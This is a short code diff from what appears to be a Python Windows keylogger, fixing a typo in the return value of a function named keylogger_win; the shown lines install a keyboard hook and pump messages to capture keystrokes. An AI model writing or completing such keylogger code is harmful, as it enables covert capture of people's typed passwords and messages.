@@ -17,4 +17,4 @@ def keylogger_win(size):
         hm.KeyDown = OnKeyboardEvent 
         hm.HookKeyboard() 
         pythoncom.PumpMessages()
-    return keysPressedsadas
+    return keysPressed
